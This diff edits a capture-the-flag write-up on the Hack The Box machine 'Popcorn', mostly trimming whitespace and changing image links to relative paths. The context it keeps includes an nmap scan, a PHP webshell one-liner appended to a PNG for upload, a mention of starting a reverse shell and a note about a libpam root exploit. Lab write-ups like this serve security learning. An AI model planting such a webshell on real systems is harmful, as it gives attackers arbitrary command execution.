@@ -19,7 +19,7 @@ nmap -sC -sV -o nmap/popcorn.nmap 10.10.10.6
 ```markdown
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
 |_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
 80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
@@ -47,9 +47,9 @@ We get the following paths back:
   - Renamer API Syntax: index.php?filename=old_file_path_an_name&newfilename=new_file_path_and_name
 - /server-status (Status: 403)
 
-That torrent page has an Upload button but we need an account to access it. 
+That torrent page has an Upload button but we need an account to access it.
 
-![Sign Up on torrent page](https://kyuu-ji.github.io/htb-write-up/popcorn/popcorn_sign-up.png)
+![Sign Up on torrent page](popcorn_sign-up.png)
 
 After login we can try to upload anything but we get a message to upload an **Torrent file**. If we look at the _Browse_ tab, we see that there is already one uploaded and the link is:
 ```markdown
@@ -66,11 +66,11 @@ We append the following code at the end of some bytes of a PNG file and send the
 <?php echo system($_REQUEST['cmd']); ?>
 ```
 
-![Upload webshell in Burpsuite](https://kyuu-ji.github.io/htb-write-up/popcorn/popcorn_upload-bs.png)
+![Upload webshell in Burpsuite](popcorn_upload-bs.png)
 
 When we browse back to the upload directory we see the PHP file:
 
-![Upload successful](https://kyuu-ji.github.io/htb-write-up/popcorn/popcorn_upload-success.png)
+![Upload successful](popcorn_upload-success.png)
 
 Now we have code execution and can start a reverse shell with:
 ```markdown
@@ -102,6 +102,6 @@ ii  libpam0g                    1.1.0-2ubuntu1            Pluggable Authenticati
 
 We see the version 1.1.0 on the box and can upload the script and run it:
 
-![Running the Privilege Escalation Exploit](https://kyuu-ji.github.io/htb-write-up/popcorn/popcorn_privesc.png)
+![Running the Privilege Escalation Exploit](popcorn_privesc.png)
 
 Now we are root!
